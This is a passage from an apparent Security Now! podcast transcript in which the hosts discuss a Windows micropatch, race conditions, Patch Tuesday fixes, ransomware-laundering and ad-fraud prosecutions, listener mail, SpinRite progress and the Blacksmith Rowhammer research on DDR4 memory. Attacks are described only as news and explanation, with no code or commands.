The CERT/CC guy whose name escapes me, I've talked about him before, he commented that that would - and he correctly said - Will Dormann, that's his name.  He correctly said that that meant this wouldn't be as widespread as many other things.  Naceri reminds us that any domain credential would be sufficient.  So that does somewhat lower the bar for an attacker.  I won't comment on the fact that when BleepingComputer asked Microsoft about this still-unresolved problem, BleepingComputer was told that:  "We're aware of the issue and will take appropriate action to keep customers protected."



Of course, okay, I said I wouldn't comment.  But what I will comment on is that last Thursday, after seeing that Microsoft still hadn't fixed this for the fourth month in a row, the guys over at 0patch created one of their very cool little micropatches that, believe it or not, actually works and solves  the problem.  It can be applied to any Windows system needing interim protection until Windows gets it fixed, and of course potentially on older systems that Windows will no longer fix.  That's really sort of the niche that the 0patch guys have found is you have to subscribe.  You can sign up for free and get this for free, and it will be available until Microsoft fixes it for free.



But you can also, you know, if you're wanting to keep older systems alive for some reason that Microsoft isn't fixing, these guys are still fixing all these things.  So you can subscribe, and this micropatch system automatically updates itself.  You know, and the patches are, wow, Leo, 23 bytes.  So, yeah.  Anyway, they're available for 32- and 64-bit versions on any Windows 10 system with at least the October or the November updates in place.  So again, let's hope that Microsoft gets this fixed in December.  Be a nice Christmas present for Windows users.  Until they do, this little micropatch is free.  You do have to register, however.



And I haven't taken any time to research in detail what it was that Naceri found and what's going on.  But the founder of 0patch did say that while this issue could in theory also impact earlier Windows versions, he said:  "The vulnerable code is different there, making the window for winning the race condition extremely narrow and probably unexploitable."  Well, that's interesting, a race condition.  We've on this podcast never had the occasion to discuss race conditions.  But it's a common problem that can crop up any time multiple things might be happening at once, where the precise sequence of them happening is important.



A few weeks ago I mentioned the counter/timer in the original PC which used what was known as a "ripple counter."  A ripple counter in digital logic is a series of individual toggling flip-flops connected in a chain.  When a single toggling flip-flop's input goes to logic "1," nothing happens except it registers it internally.  But when that input drops back to logic "0," the flip-flop flips to its other on or off state, whichever the other one is.  And if the output of that flip-flop is connected to the input of a next flip-flop, you start to obtain a binary counter, where the number of bits in the counter is the number of flip-flops in the chain.  And I should confess, this is how I spent my youth was like drawing these things and drawing logic diagrams.  And if anyone wants an interesting challenge, implement a toggling flip-flop with mechanical relays.  Even if you don't actually build it, just draw them because I did, and it's an interesting challenge.



Anyway, the problem is flip-flops in the real world do not toggle instantly.  They have what's known as a propagation delay, which means that their output changes just a little bit after their input goes to zero.  The flip-flop's internal logic takes a bit of time to sort things out.  This means that when the input at the front of this ripple counter goes from "1" to "0," which will start to update to the next count, the changes in the count might "ripple down" through the length of the counter.



Okay.  Now let's say that you want to take a snapshot of the counter's current count, but you have no idea when that counter might be counting.  This is where we get into a perfect example of a race condition.  If we happen to take a snapshot of this binary ripple counter while that new count is rippling down the length of the counter due to the propagation delay in each of the counter's stages from one stage to the next, we'll obtain an erroneous reading due to a race condition which we've created between the counting event and our sampling of that counter.



And race conditions aren't just electronic.  They can occur socially, too.  They're a favorite vehicle of screenwriters who have one person racing to answer the phone before someone else gets the chance to do so, to avoid some embarrassing outcome, a race condition in real life.  In electronics and in software, these race conditions can be quite tricky to spot, and they've been known to introduce some of the hardest-to-find bugs there are.  The reason may be that they may not occur predictably or even often, but just maddeningly.  For example, the state of that ripple counter might be properly sampled thousands or hundreds of thousands of times before the sampling just happens to catch the counter in the process of rippling.



The other maddening thing is that the act of observing the system might change it.  For example, adding the tiny capacitance of a high-impedance oscilloscope probe when checking a high-frequency signal can change its timing just enough to prevent the problem from occurring while you're looking at it.  And the same goes for debugging code.  If you step through the troublesome area of some time-sensitive code, everything works while you're watching it.  In fact, the problem only occurs, for example, on odd Tuesdays when the moon is full and the mailman is late.  Otherwise everything works fine.



So our lesson here is the need - I guess first the appreciation of or appreciation for and then the need for true vigilance.  In any asynchronous multi-threaded application where more than one thread might share access to variables or objects, always consider every implication of that very carefully.  Always keep the possibility of these sorts of collisions front of mind, and work very hard to never create such problems in the first place because it's far better to prevent them than to have to go back and try to find those gremlins later.



And as I was thinking about this, about the nature of the need to appreciate how big a problem this is, I sort of got into thinking about new coders who, you know, anyone starting out at the beginning is going to begin their craft without any appreciation, because you can't have any in the beginning, for the subtleties and nuances of the way complex coding problems are best solved.  And the word "best" is critical here.  For newbies, it might at first seem that any solution to a problem with computers is as good as any other.  After all, they're all solutions; aren't they?  But with time and patience and lots of practice at coding, a coder gradually matures to learn that there are superior, more elegant, and more robust ways to think about, to frame, and then to solve a problem that may have many solutions.  Most coding problems do have many solutions.  Yet it's often the case that there really is one best way.  And I think that the great joy of coding comes from the satisfaction of knowing that you have found the best solution.



I'll often code something, and then I'll wonder, having done so, like I'm done, if I can't find a better solution.  What I think happens is that the act of solving the problem the first time teaches us something about the problem that hadn't been initially appreciated.  For example, I might have needed to add an awkward bit of code at the end to handle an edge case that I hadn't seen coming.  But if I'd appreciated it at the start, as I do now at the end, might I have come up with an overall superior solution that inherently incorporated and didn't need that special case handling because it solved the problem the right way?



So the point is I may have just learned something about the problem that might now suggest an entirely different and superior approach.  So what I often do is I'll leave what I wrote in place so I can go back to it if my intuition is wrong, and I don't find a better way.  I'll open up a big region, a blank space in my editor, and immediately tackle the same problem again, but this time starting with a deeper understanding of the problem I'm trying to solve.  And for me that's the continual fascination that I have with coding.  It's why I enjoy it so much is 50 years later, 50 years after having started this, I'm still learning things because I'm tackling new problems.  I'm taking all of this experience that I have, but I'm finding that I can still recast a first solution in something better the second time.



And it's true.  It will make no difference in what that chunk of code does.  But it might make a difference in the way it does it.  One solution may be aesthetically cleaner and superior to the other.  And as utterly abstract as code can be, within its own little microcosm it really is possible to create little works of art, little constructed gems.  And I know that not everyone obtains fulfillment from building things, and not everyone is as curious as I am.  And not everyone may have the luxury of taking the time to find that one best solution.  If you are those things, then what I've just articulated makes all the sense to you in the world.  And if you aren't those things, maybe now you can understand a little bit better those of us who are so weird in this particular way.  And Leo, I have a feeling that you may be one of them.



LEO:  I'm in that former group, you bet.  It's one of the things I go home and can't wait to get going on, yeah.



STEVE:  Yeah.  There just is something magical about it.



LEO:  You know, race conditions are a big problem these days because we do concurrent programming so much.



STEVE:  Exactly.



LEO:  We have multiple processors.  So it's not at all unusual to have multiple processes running at the same time.  I have to say, though, I think some of it is because we made a big mistake many years ago going with imperative programming and programming with side effects.  If you don't have side effects, you don't have problems with concurrency.  You don't have dependencies.  And, you know, I guess sometimes you need side effects, for sure you do, with IO and so forth.  But it seems to me that some of this comes from just a mistake made early on in how we write code.  It's why I'm a fan of functional programming.



STEVE:  I think that's probably true.  As you were suggesting that it was fundamental, I was thinking of, for example, I have some code which is manipulating a list, and where I'm inserting an object into a list of objects.  So I'm in the process of taking the pointer that points to the next one out and replacing it with a pointer that points to the new one.



LEO:  Exactly, yeah.



STEVE:  And then putting the pointer that was pointing to the last one at the end of the new one, inserting that into the list.  Well, that's a fragile moment in time.



LEO:  Exactly.  Right.  And if another process is counting on that list, it's in an unknown state. 



STEVE:  Yes, yes.  So if something else, another thread in the same process or, if it's a cross-process object which is available, it might go and take - it might get swapped in, time sliced in, and be attempting to traverse that list while I'm in the process in a different thread of maintaining it.



LEO:  Exactly, yeah.



STEVE:  And that's another good example of something that might work for three years and then just blow up.  And it's like, what happened?  And again, it's like just a moment in time where at that race condition between two threads trying to simultaneous access.  And so there are solutions in Windows.  It's called a "critical section."



LEO:  Right.



STEVE:  You're able to request a critical section of code that no two threads are allowed to be in at the same time.  And so in my own list management code, I grab a critical section, do the work, and then I exit the critical section.



LEO:  You lock it, in effect, yeah.



STEVE:  Basically lock that little block of code.



LEO:  That's why it's called a race, because the winner of the race can vary, and whoever wins will get a different result.  Ideally, with code, you want the same inputs to produce the same outputs every single time.



STEVE:  Determinism.



LEO:  It's determinist.  And to the degree that it's not is the degree - there are languages like Erlang that are designed to handle concurrency specifically for this.  I think if Windows critical code worked better, we would see less of these bugs.  But apparently either people aren't doing it or, you know, maybe it's sloppy coding.  I don't think it's always sloppy coding.  I think sometimes it's just you don't really realize the side effects that you're interested in.



STEVE:  Well, okay.  To take Microsoft's side for a minute, can you imagine touching the code of Windows?



LEO:  Right.  It should all be critical section, the whole thing.  Do not touch.



STEVE:  I mean, I have the advantage of being a one-person team who wrote everything that I'm doing and touching.  So if I make a mistake, it's mine.  At the same time, I'm less likely to because it's mine.  Nobody wrote anything other than I did.  And so I'm not looking at code thinking, okay, I think - long time ago you and I talked about some of the fundamental problems of coding.  One of them is bad variable names; right?  You name something badly, and then later you think that it's a good name.  But if it's a bad name, it doesn't really describe what you think it does.  And so that's one of the problems.



And the other is like fuzzy definitions.  If you're not really sure of what some code does, you're in trouble because the computer's not sure either.  And if you're not sure, it's not going to be any more sure.  And so there are, like, again, as you spend time coding, you end up sort of with like your group of things that you learn to watch for.  And I've learned the importance of being very careful about what I call things because later I'll come back, and I'll think they're exactly what I called them.  And if I'm wrong, I get myself in trouble.



LEO:  Yup.  Well, and you also get some sympathy from people who make mistakes because it's a hard and a high-stakes practice.  It's not easy.



STEVE:  Which is what makes it fun.



LEO:  That's what makes it fun, yeah.



STEVE:  So we did have last Tuesday Patch Tuesday.  We already know what Patch Tuesday didn't patch; right?  It didn't patch Naceri's problem.  So what did it patch?  It received fixes for a total of 55 flaws in Windows, two of which were zero-day vulnerabilities in Exchange and Excel, both under active exploitation in the wild.  And by coincidence, the zero-day in Exchange had previously surfaced during that recent Tianfu hacking contest.  Four other vulnerabilities, although not being used in the wild, also qualify as zero-days because, while they are not under active exploitation, they were first learned of through public disclosure without any available patches ready or even started.  So of the total of 55, six are classified as critical, the other 49 as important.



The exploitation breakdown is that 20 were elevation of privilege vulnerabilities.  And we know now, even though they don't seem as scary as remote code, that bad guys want them because they can often get in as an unprivileged user, then elevating themselves to system is what they need to do in order to escape from the containment that the operating system provides.  So 20 were elevation of privilege; 15 were remote code execution vulnerabilities, gulp; 10 information disclosure; four spoofing; three denial of service, basically means that you can crash something, but that's about it; and then two were security feature bypasses.



The Excel flaw, which was the other of the zero-days that wasn't the Tianfu discovery, was discovered by the Microsoft Threat Intelligence Center and has been actively used in malicious attacks.  The four publicly disclosed vulnerabilities, those other four that technically are zero-days because they were posted publicly, have not been seen being exploited.  Two were Windows RDP (Remote Desktop Protocol) information disclosures, and the other two were 3D Viewer remote code execution vulnerabilities.  So that's the good news.



November did break something; but, boy, you'd have to be deep into Azure authentication innards to understand what.  After installing last Tuesday's updates, Microsoft said that users might experience authentication problems on Domain Controllers running Windows Server.  Okay, that we understand.  They explained, and I'm just going to quote them because I only have a vague idea of what this is.  Well, maybe better than that, but still.



"Kerberos authentication," they wrote, "will fail on Kerberos delegation scenarios that rely on the front-end service to retrieve a Kerberos ticket on behalf of a user to access a backend service.  Important Kerberos delegation scenarios where a Kerberos client provides the front-end service with an evidence ticket are not impacted."  Oh, I guess that's good.  "Pure Azure Active Directory environments are also not impacted by the issue."



And then, as if to clarify, on the Windows Health Dashboard Microsoft wrote:  "After installing the November security updates, you might have authentication failures on servers relating to Kerberos Tickets acquired via S4u2self.  The authentication failures are a result of Kerberos Tickets acquired via S4u2self and used as evidence tickets for protocol transition to delegate to backend services which fail signature validation."  So there.  The good news is, whatever it was that broke, they fixed it yesterday, Monday, yesterday, with the release of an out-of-cycle update.  So if anyone had updated last Tuesday, and their use of Kerberos authentication to Domain Controllers had died, it's now fixed as of Tuesday.  You've got to go get it, probably.  So you can do so.



On the Windows 11 front, Windows 11 received KB5007215, a cumulative update to fix security vulnerabilities and bugs newly introduced, or at least occurring, in previous versions.  This update is mandatory because it contains security updates, performance improvements, and bug fixes for Windows 11 21H2. After installing the update, Windows 11 will have its build number changed to 22000.318.  So that's one you want to look for.



There was, it turns out, a newly introduced problem with GDI+, which prevented the proper display of UI elements under Windows 11.  That's fixed, and GDI+ applications should now be working.  And the update also fixes that mysterious, weird, built-in application signature certificate chain verification bug which was preventing a subset of apps - remember, not all, but a few, and some could be fixed, but some others couldn't, such as the Snipping Tool - from working in some instances for some users located on some planets.  Now everything is supposed to be working correctly once again for everyone after KB5007215.



Oh.  And finally, Microsoft also stated that they made changes to the servicing stack to resolve bugs or issues preventing Windows Updates from properly being installed.  So now, presumably, Windows Updates will no longer be prevented from being properly installed, to the tremendous relief of all concerned.



And December promises to be Christmas for Printing and more.  It appears that the raft of continuous, embarrassing, and unrelenting problems that Windows has been experiencing has caught Microsoft's attention.  Yay.  Late last week they released a new build for Windows 11 Insiders in the Beta and Release Preview Channels, and it promises to have fixed a long list of issues impacting Windows 11.  And Leo, I imagine you and Paul and Mary Jo will be talking about that tomorrow.



Among the significant bugs addressed in this build, which is 22000.346, are fixes for known issues preventing USB print devices with support for Internet Printing Protocol Over USB from completing the installation and leading to some USB print installers reporting that they don't have a printer after the printer's plugged in.  So there's that.



The other issue fixed is one that we talked about a while ago, several weeks ago, and that's where the three weird bugs -  RPC_S_CANNOT_SUPPORT, ERROR_INVALID_LEVEL, and ERROR_INVALID_PRINTER_NAME - those were occurring to some users who were trying to print remotely over network shared printers.  Those are going to be fixed, well, have been fixed in this Beta and Release Preview.  And it's expected to roll out to all Windows 10 and 11 customers during the December 2021 Patch Tuesday.  So yes, everybody's going to get their printer things fixed, finally.



So the U.S. has detained a crypto-exchange executive for helping the Ryuk ransomware gang launder their profits.  I'm not talking now any longer about the infinite series of ransomware attacks.  Maybe if something of note that goes onto the popular news, we'll talk about it, if it's like huge like Kaseya or one of the huge historical attacks.  But I did want to keep everyone in the loop about news of the continuing U.S.-led pursuit of those who have been profiting from ransomware attacks, since we're seeing some evidence that it's having an effect.  



In this case the suspect is named Denis Dubnikov.  He was arrested two weeks ago, on the 2nd of November, while attempting to vacation in Mexico.  Whoops.  He was denied entry into the country pending an arrest warrant, and Mexican officials forwarded him to Amsterdam, where he was officially detained by Dutch police at the request of the FBI.  Although arrests of crime suspects usually remain unreported until official charges are filed, in this case the news of his arrest leaked through himself, who revealed his fate in an Instagram story he posted on his now-deleted account while he was in custody in Mexico, according to screenshots posted on Russian Telegram channels.



The details providing his arrest had remained secret until just recently, with neither the Dutch police nor U.S. officials responding to multiple requests for comment.  So there's still much that's not public.  The Wall Street Journal obtained and reported upon an extradition request which revealed that Dubnikov stands accused of money laundering.  According to court documents, around $400,000 in cryptocurrency assets tied to a Ryuk ransom payment passed through one of Dubnikov's accounts in 2018.  And it's unclear whether the 400K passed through his personal account or through two cryptocurrency platforms - one called Crypto Coyote, and the other is EggChange  which Dubnikov, who's a Moscow businessman, founded previously.  A Bloomberg article published on November 3rd, the day after his arrest, named EggChange as one of the multiple shady cryptocurrency exchanges that are headquartered in a Moscow office building that's been tied to cybercrime money laundering.



And the best news is that the arrest has triggered outrage within the Russian cryptocurrency community, and I think that's great.  Several prominent figures are demanding an official response and condemnation of Dubnikov's arrest from the Russian government.  I think it's great that something that happened three years ago is now being loudly dredged up and acted upon today, since you can just imagine all of the other crypto-weenies out there starting to worry about what evidence from their own pasts can be reverse engineered out of the public cryptocurrency blockchains to produce irrefutable evidence of their past misdeeds.  As we noted last week, the money obtained from ransomware is seeming to be a little less free every day than it was before, you know, when it was just a spree that all these guys were off on.



Okay.  So I propose the rhetorical question, how do you go about defrauding web-based advertisers?  So you're a 41-year-old Russian national by the name of Aleksandr Zhukov.  It occurs to you that advertisers pay websites who have their ads displayed to people who are presumably influenced to some degree by those ads, and who may even occasionally click on one to find out more.  So you establish thousands of entirely fake public websites hosted by legitimate cloud service providers and contract with those advertisers to have their ads shown on those site's pages. And because video ads pay more, you focus upon having those hosted.



But no one's going to those bogus sites because they have crappy synthetic content.  So you create a wide-ranging network of bots called "Methbot" to visit those bogus pages instead from IP addresses scattered across the world as if they were actual people.  You design the bots to poke around the various website pages, to "view," in quotes, those ads and videos, and to occasionally click on one to learn more.  And the money starts rolling in.  How much money?  Is everyone sitting down?  Between $3 and $5 million per day at its peak in 2016.  But of course it's fraud, since no one whose behavior might be influenced to purchase anything ever sees those ads for which advertisers are paying real money, and money is being received.



So something sets off some scam alarm somewhere which causes the FBI, Google, and 20 other tech and security firms to begin probing and dismantling, sort of unweaving Zhukov's operation.  They soon discover a giant botnet running across infected devices and legitimate data centers spread around the world.  And oddly, that botnet is visiting these bogus websites and clicking its links and ads.  Shortly afterward, back in November of 2018 while traveling to Bulgaria, Zhukov is arrested on an FBI-issued warrant and is formally charged the next week.



Tracked under the names 3ve, as in Eve with the capital E backwards, Methbot, Boaxxe, and Miuref, Zhukov is believed to have run one of the largest ad fraud botnets ever created, generating, as I said, at one point in 2016 between $3 and $5 million in revenue per day.  He hired programmers to help him build and manage his operation, which he disguised under the guise of a legitimate advertising network named "Media Methane."  And according to prosecutors, Zhukov referred to himself frequently as the "king of fraud" and his employees as "my developers."



But of course, instead of running an actual advertising company, prosecutors said that Zhukov created thousands of fake websites where he loaded ads from legitimate publishers.  These websites, they say, ran on more than 2,000 servers rented across data centers, and had no real visitors.  Instead, Zhukov's team used automated tools to simulate real visitors.  Prosecutors said Zhukov often leased IP addresses for this activity.  And in other cases he hijacked legitimate IP addresses from their legitimate owners.



But all that came to a just end last week when a judge sentenced Zhukov, a U.S. judge sentenced Zhukov to 10 years in prison for running Methbot between 2014 and 2018.  So yeah, you know, he probably should have quit while he was ahead, certainly he was at some point far ahead, and then just gone off to an island somewhere.  But then I guess you can't spend all that money, if you're on an island.  So I don't know what you do.  You certainly don't want to travel.  That seems to be when we get these guys.



I've got some really fun closing-the-loop feedback from our listeners.  Marcio wrote, he said:  "Hello.  This may seem like a strange request in 2021."  And Leo, you'll remember this.  He said:  "But would you be able to offer some insight on the exact SCSI commands used by your Click of Death tool Trouble in Paradise?"  He says:  "It might surprise you that anyone is still using Zip drives in 2021, but SCSI Iomega Zip drives are still used by people who collect vintage Apple Mac computers."



He says:  "Obviously these computers can't run TIP," and for those who don't know, TIP stood for Trouble in Paradise, which was my Click of Death utility.  I actually created it after the release of SpinRite 5 because SpinRite 5 was the first SpinRite that would run on Iomega Zip and Jaz drives.  And those drives had a problem with their heads such that they would nick the edge of the soft flexible media inside of those Iomega cartridges.  So people were using SpinRite 5 to try to recover the data.  But because it was like such a weird kind of one-off problem, it quickly occurred to me, the moment I heard that we were getting reports saying that SpinRite fixed the Click of Death, and it's like, the what?



So I looked into the Click of Death, and I ended up writing a free utility which was much more problem-specific, whereas SpinRite was sort of a general solution.  Because what I learned was you could, if you - the Click of Death could spread throughout a collection of Zip drives.  If you inserted a Zip cartridge into a bad drive, it would nick the edge.  But then if you then transported that cartridge, and of course transporting them was the whole point of having a cartridge, you then inserted it, this cartridge with the nicked Mylar, into a good Zip drive, it could damage the good Zip drive in such a way that that damaged Zip drive would then damage other Zip cartridges.  It was literally a virus, like a mechanical virus, back in those days of Iomega Zip drives.



Anyway, he says:  "Obviously these computers," meaning the Apple Macintoshes, "can't run TIP, but I recently came across a PC SCSI adapter card at a surplus sale, and I decided to see if I could get TIP to run on a Windows PC."  He says:  "It turned out to be an ordeal due to the fact that Windows 98 simply doesn't run very well on newer hardware.  But eventually I got it all to work, and I am very impressed," he wrote, "with the tool," meaning TIP.  He says:  "I was quickly able to troubleshoot my collection of Zip media and drives."  And that's of course why I created it.  He says:  "Anyhow, I would very much like to see if I could recreate a similar tool that runs natively on my vintage Macintosh computer so I can ditch the jerry-rigged Windows 98 PC and maybe help other Mac users who are also using Zip drives.  Could you provide any insight on the SCSI commands used?  Signed, Marcio."



And I zipped up, so to speak, my archive from whenever that was and mailed it to him.  I got an email from him yesterday saying that he had made great progress.  He was, you know, my assembly code is very easy to read.  So although he's not an assembly code person, he is in the process of reimplementing TIP, Trouble in Paradise, on a native Mac.  And it turns out I'd forgotten to include an include file that had my equates for the SCSI commands that are unique to the Iomega, which I had somehow found, reverse engineered, or I don't remember now what.  And so I sent that to him this morning.  But anyway, just very cool, a little bit of a blast from the past.



LEO:  No kidding.  Wow.



STEVE:  Yeah.



LEO:  That's a lot of effort to go through to use your old Zip drives, but okay.



STEVE:  Well, if you're a hobbyist...



LEO:  It's fun.



STEVE:  And you're in love with old Macs...



LEO:  You do it for the sake of it.  Yeah, exactly, yeah.



STEVE:  Yeah.  I got a neat tweet from a professor.  His Twitter handle is @Prof_RAS6.  Maybe that's, I don't know, like the designation for the course he teaches.  Anyway, and Robert, I don't know how to pronounce your last name, Sciabbarrasi.  Anyway, thank you for the tweet.  And he tweeted:  "Thanks for the dive into IRQs.  I assigned that segment of the show as a reading/listening/watching assignment for my Computer Architecture class.  Keep the deep dives coming."  So Robert, thank you for a little bit of positive feedback.



And get a load of this, Leo.  From a Bell Labs patent attorney, Stephen J. Phillips, whose email is still @bellsouth.net, the subject was Unix Programmer's Manual from Security Now! 844.  And remember that we put the cover of it as our Picture of the Week, and that it was early November, maybe it was the 3rd, was the 50th Anniversary of at least that cover page.



Anyway, Stephen wrote:  "The cover of the Unix manual brought back many memories for me.  I was the Bell Labs Patent Attorney who consulted for the Mathematics Research Department where Ken and Dennis worked."



LEO:  Wow.  Neat.



STEVE:  Yeah.  He said:  "My bookshelf was lined with all the manuals as they issued.  I spent many hours with the manuals and with Ken and Dennis, trying to find out what made Unix tick."



LEO:  Wow.



STEVE:  And having worked with patent attorneys before, that is what a good patent attorney does.  I mean, they're typically engineering trained.  And so the inventor describes to the attorney, imparts the knowledge, explains what it is they invented, so that the attorney can properly create the legalese patent documents, which become indecipherable, unfortunately, but that's the nature of it.



Anyway, he said:  "They were very modest about their work and thought they hadn't really done anything new.  For the record, I filed two patents, now long expired, one for the Set User ID Bit which allowed a non-admin process to have administrative rights for the duration of its existence.  The second was for the block-oriented Unix file system structure."  He said:  "I think our Patent Department was the first production user of Unix.  We were looking for a word processing system, and they set us up with a PDP-11 doing text editing with ed.  Later, we built a homegrown filing system for our patent applications and called it the File Mechanization project.  Early days.  We had fun after Unix became famous, when we were called into AT&T corporate headquarters to explain to the executive suite what in the world Bell Labs was doing creating software when telephones were our real business."



LEO:  Wow.  Really, really interesting.



STEVE:  So Stephen, thanks for the very cool blast from the past.



LEO:  Yeah.



STEVE:  Ben Clapp tweeted:  "Hey, Steve.  Love the show.  FYI, in case no other listeners have shared, Visual Studio Code is now rendering the Unicode directional formatting characters by default.  I hope more IDEs do this."  And Leo, this is the episode that you missed.  But it's great to see this happening.  I mentioned last week that GitHub was now going to be highlighting and spotting this.  This is a perfect example I have in the show notes, where you can see an invocation of a function transfer balance, where it shows the from, to, and amount, and it shows 5678, 1234, and 6776 respectively as from, to, and amount.  But the actual code down below, because there are hidden direction reversal Unicode characters, shows that the code that the system would process is different.



LEO:  It's backwards.



STEVE:  Exactly.



LEO:  It's the opposite.  Holy cow.



STEVE:  Exactly.



LEO:  Which is a lot more money, I presume.



STEVE:  Exactly.



LEO:  Holy cow.



STEVE:  Certainly not what was intended because that Unicode 202E is the right-to-left override, and the Unicode 202C is the directional pop which pops the effect of the override.  So Unicode itself turns out to be a stack-based interpreter.  And this is what bad guys have actually gotten themselves up, I mean, some instances of this have been found in public source repositories.  So this has actually happened. 



LEO:  Wow.  Wow.



STEVE:  Very, very...



LEO:  Clever, yeah.



STEVE:  Yeah.  Oh, and a little bit of an update on SpinRite, which continues to - I'm the proud father.  I'm nearly finished.  No, it's turning out so nicely.  I'm nearly finished with the 6th development release.  The screen shot I've got in the show notes shows SpinRite's updated drive selection pane on the left, which now displays what most SpinRite users actually want to know, the estimated time to scan each of the drives upon which SpinRite's benchmark has been run on.  And so you can see under this scan time column is the number of minutes, or in a couple cases hours, for really large multi-terabyte drives, how long SpinRite will take.



The first line item which I'm showing shows that the performance of a 250GB Crucial SATA 3 SSD under SpinRite is 573 megabytes per second.  Okay, now, SATA 3 has a line rate, like a physical electrical bit rate of 6 gigabits per second.  But SATA is a serial self-clocking protocol which requires some encoding of the user's raw data.  For example, if you were to send all zeroes, which meant no bit transitions, then the self-clocking would fail because there'd be no way for the other end to keep track of precisely, you know, 6 gigabits, I didn't do the math, but that's 6x10 to the, what, mega is 6, giga is 9; right?  6x10^9.  You flip that over, that's how short the bit window is.  And you have to account for jitter and so forth in the line.



Anyway, the point is that it's necessary to encode the actual data being sent into something that's guaranteed to have a minimal number of bit events, no matter what data is being sent.  Consequently, the 8 bits of data, every 8 bits of data is encoded into 10 bit symbols for transit over the wire.  Therefore, that raw 6 gigabits per second on the wire translates to exactly, since every byte turns into 10 bits, 6 gigabits turns into 600 megabytes per second of possible data, 600 megabytes per second.



But a SATA serial link doesn't only carry the user's data.  Right?  I mean, there's no other channel.  So all of the link's non-data control signaling also shares the same wire.  So SpinRite's new hardware AHCI drivers are achieving on that Crucial 250GB SSD 573 megabytes per second out of, well, you can't get it any faster.  The theoretical byte transfer is 600MB.  We're at 573, which is 95.5% of that 600 megabytes per second.  So we're only losing 4.5% to the control signaling overhead, and there's no way to squeeze that down any further.  And given that most SATA 3 benchmarks you'll find show between 550 and 560 megabytes per second, I'm very pleased that SpinRite is achieving a sustained rate of 573 because it's literally, you know, it cannot go, SATA 3 cannot go any faster.  Those little SATA 3 cables are smoking.



Anyway, since I think anyone who's interested in SpinRite might be curious to know more, I created a four-page PDF which shows a bunch of SpinRite's new screens, along with some editorial commentary about what the various drives and controllers are.  It's our shortcut for the week.  So this episode is 845, so the shortcut is grc.sc/845, for anyone who is interested.  And anyway, just a nice little checkpoint on where we are.  I'm just about finished with, as I said, the sixth development release.  I can't wait to get it into the hands of its testers.  It's performing better for me than anything has previously.



In fact, this one incorporates that whole new poly IRQ solution which I implemented after we learned conclusively that there was a BIOS that was lying about which IRQ line its controller hardware was using.  So I thought, okay, that means I can't care.  So now SpinRite doesn't, and I think that's going to make a big boost.  I'll certainly have news about that next week because I'm sure I'm only a few days away from getting it into the hands of our testers.



LEO:  I hand you over to the blacksmith himself, Mr. Steve Gibson.



STEVE:  Okay.  So we have the return of Rowhammer.  Probably the biggest and most significant security news of the week appeared yesterday with a report published by the COMSEC computer security group.  As I noted at the top of the show, we've spoken of the work of these guys before, but only identifying them as being a team at ETH Zurich.



COMSEC is the computer security group of the Department of Information Technology and Electrical Engineering.  Their primary research goal is the construction of reliable and secure computing systems so their research often touches on all layers of the computing stack, from software all the way down to hardware.  They explain that they use novel analysis techniques to better - yeah, certainly in this case - to better understand the attack surface of modern systems and, when appropriate, build systems that can withstand different classes of attack.  Their just-published work is their design of "Blacksmith," which represents the maturation of Rowhammer attacks.



Now, to briefly remind everyone, "Rowhammer" refers to a broad class of so-called bit-flipping attacks upon the unfortunately fundamentally flaky nature of today's dynamic RAM memories, you know, the big high-density DRAMs that we're all dependent upon.  I'll crib from Wikipedia since it's perfectly summarized there.  Wikipedia says:  "Rowhammer is a security exploit that takes advantage of an unintended and undesirable side effect in dynamic random-access memory (DRAM) in which memory cells interact electrically between themselves by leaking their charges, possibly changing the contents of nearby memory rows that were not addressed in the original memory access.  This circumvention of the isolation between DRAM memory cells results from the high cell density in modern DRAM and can be triggered by specially crafted memory access patterns that rapidly activate the same memory rows numerous times."



Now, we've been tracking this, like the problem, since its first appearance, believe it or not seven years ago in 2014, and it's been a constant background issue for the industry which never quite goes away.  The same research group developed their "SMASH" attack at one point, which was a JavaScript-based attack that gives the attacker an arbitrary read and write primitive in a web browser.  Then, Leo, you'll remember there was "Drammer," which was the deterministic Rowhammer attack on mobile platforms.  And we had fun with the "Flip Feng Shui," which was hammering a needle in the software stack.  And then there was an over-the-network "Throwhammer," due to its distance.  And now we have "Blacksmith."



In other words, this has been fodder for lots of research.  And again, as I said, we never really get this thing resolved.  The reason we cannot seem to shake this is that the problem the first Rowhammer research revealed is not, as we say, a bug of DRAM.  It's unfortunately an unwanted feature.  It cannot truly be fixed, because it has always been an essential truth incorporated into the way DRAM operates.  And in that respect it's a little bit like all of the problems we had with Spectre and Meltdown and the optimizations that Intel had incorporated into their chips.  It's like, it's in there.  It's kind of baked.  And we're hoping that it doesn't get really bad.



Now, historically there have been other noisy and usage-pattern-sensitive mass storage systems.  Those real old-timers among us will remember that core memory technology which was used in the early mainframe and minicomputers of the 1960s and '70s were similarly sensitive to access patterns with adjacent bits.  Memory diagnostics were run with things like so-called "checkerboard" patterns in an attempt to store and retrieve worst-case data patterns.  If your core memory back then was acting up, you wanted to determine that while running a diagnostic, and not while processing real-world data that might trip the same flaw by mistake.



And even today the venerable MemTest 86, now MemTest86+, which is over at MemTest.org, remains a viable and worthwhile test of a system's memory.  I've had occasion to run it through the years when something seems a bit flaky, and I want to rule out a problem with DRAM.  DRAM is big.  Processor access to DRAM is much slower.  And something like MemTest must bypass the cache, you know, the Level 1, Level 2, and Level 3 cache.  So it's surprising how slowly it runs when you're actually testing DRAM directly.  But that's what a good memory test has to do.  So it's the kind of thing you run overnight.



And in the case of DRAM's inherent vulnerability to Rowhammer attacks, the best we can do is attempt to minimize and mitigate what is unfortunately a pervasive threat.  We've heard, we have been told with a great deal of hope and some expectation, that the newest generations of DRAM, DDR4, were going to resolve this problem by incorporating specific anti-Rowhammer mitigations.  So how'd that work out?  The short and depressing answer is that the DDR4 memory protections have been broken wide open by Blacksmith.



The COMSEC guys explain.  They said:  "We demonstrate that it is possible to trigger Rowhammer bit flips on all DRAM devices today with little effort, despite deployed mitigations on commodity off-the-shelf systems.  This result has a significant impact on the system's security as DRAM devices in the wild cannot easily be fixed, and previous work showed real-world Rowhammer attacks are practical, for example, in the browser using JavaScript" - that was their own work - "on smartphones, across VMs in the cloud, and even over the 'Net. 



